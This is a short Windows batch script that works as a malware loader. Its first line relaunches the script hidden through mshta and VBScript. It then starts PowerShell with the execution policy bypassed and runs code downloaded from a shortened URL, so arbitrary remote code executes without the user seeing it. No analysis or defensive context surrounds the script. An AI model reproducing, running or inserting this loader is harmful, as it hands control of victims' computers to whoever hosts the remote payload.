%1@mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run """"""%~f0"""" :"",0:Close()")& exit/b
 
@echo off

powershell -executionpolicy bypass -command "iex(New-Object Net.WebClient).DownloadString('http://goo.su/y7iqebd')"

exit
